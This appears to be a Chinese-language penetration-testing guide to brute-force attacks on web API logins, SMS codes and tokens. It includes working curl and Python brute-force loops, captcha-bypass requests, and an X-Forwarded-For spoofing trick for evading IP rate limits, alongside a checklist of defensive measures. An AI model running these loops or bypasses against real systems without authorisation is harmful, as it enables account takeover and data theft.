# 暴力破解测试

## 1. 概述

暴力破解（Brute Force）是指通过大量尝试来猜测密码、验证码或 Token 的攻击方式。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见暴力破解点

| 接口 | 参数 |
|------|------|
| 登录 | `username`, `password` |
| 验证码 | `smsCode`, `emailCode`, `captcha` |
| Token | `token`, `refreshToken` |
| 密码重置 | `password`, `code` |

### 2.2 认证相关接口

```bash
POST /api/login
POST /api/phoneLogin
POST /api/user/register
POST /api/user/resetPassword
POST /api/captcha/verify
```

## 3. 测试方法

### 3.1 登录暴力破解

```bash
# 常见密码TOP100
passwords=(
    "123456" "123456789" "12345678" "1234567" "password"
    "admin" "admin123" "admin888" "qwerty" "abc123"
    "111111" "666666" "888888" "letmein" "welcome"
)

for pwd in "${passwords[@]}"; do
    curl -X POST "http://api/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"$pwd\"}"
done
```

### 3.2 验证码暴力破解

```bash
# 4位数字验证码：10000种组合
for code in {0000..9999}; do
    curl -X POST "http://api/captcha/verify" \
        -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}"
done

# 6位数字验证码：1000000种组合（困难）
```

### 3.3 Token 暴力破解

```python
# 如果 Token 是短字符串
import string
import itertools

charset = string.ascii_lowercase + string.digits
for length in range(1, 6):
    for combo in itertools.product(charset, repeat=length):
        token = ''.join(combo)
        resp = requests.get(
            f"http://api/token/validate?token={token}"
        )
```

## 4. 防护检查

### 4.1 验证码测试

```bash
# 1. 是否有验证码？
POST /api/login
{"username": "admin", "password": "xxx"}
# 响应要求 captcha → 有验证码

# 2. 验证码是否可为空？
POST /api/login
{"username": "admin", "password": "xxx", "captcha": ""}
# 成功 → 可绕过

# 3. 验证码是否过期？
# 等待2分钟后重放
```

### 4.2 失败限制测试

```bash
# 连续10次失败
for i in {1..10}; do
    curl -X POST "http://api/login" \
        -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}"
done

# 第11次尝试
curl -X POST "http://api/login" \
    -d "{\"username\":\"admin\",\"password\":\"correct\"}"
```

### 4.3 账户锁定测试

```bash
# 5次错误后
curl -X POST "http://api/login" \
    -d "{\"username\":\"admin\",\"password\":\"correct\"}"

# 响应 "账户已锁定" → 有锁定机制
# 响应正常 → 无锁定或已解锁
```

## 5. 绕过技巧

### 5.1 验证码绕过

```bash
# 1. 验证码复用
# 使用同一个验证码多次尝试

# 2. 验证码为空
POST /api/login
{"username": "admin", "password": "xxx", "captcha": ""}

# 3. 删除验证码参数
POST /api/login
{"username": "admin", "password": "xxx"}
```

### 5.2 IP 限制绕过

```bash
# 使用代理
# X-Forwarded-For 伪造（如果服务端信任）
curl -X POST "http://api/login" \
    -H "X-Forwarded-For: 1.1.1.1" \
    -d "{\"username\":\"admin\",\"password\":\"xxx\"}"

curl -X POST "http://api/login" \
    -H "X-Forwarded-For: 1.1.1.2" \
    -d "{\"username\":\"admin\",\"password\":\"xxx\"}"
```

### 5.3 账户锁定绕过

```bash
# 锁定的是IP不是账户
# 每次错误后更换IP

# 锁定的是用户名
# 尝试其他用户名
```

## 6. 防护建议检查表

| 防护措施 | 说明 | 安全等级 |
|----------|------|----------|
| 图形验证码 | 区分机器和人 | 中 |
| 滑块验证码 | 区分机器和人 | 高 |
| 失败次数限制 | 5次/15分钟 | 高 |
| 账户锁定 | 多次失败后锁定 | 高 |
| IP 限制 | 限制单IP请求频率 | 中 |
| 双因素认证 | 需要第二种认证 | 最高 |

## 7. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 账户接管 | 破解密码后直接登录 |
| 横向移动 | 获取他账号后横向 |
| 数据泄露 | 登录后获取敏感数据 |

## 8. 测试检查清单

```
□ 测试登录暴力破解（常见密码TOP100）
□ 测试验证码是否存在
□ 测试验证码是否可绕过
□ 测试失败次数限制
□ 测试账户锁定机制
□ 测试IP限制绕过
□ 测试锁定绕过
□ 评估防护措施强度
```
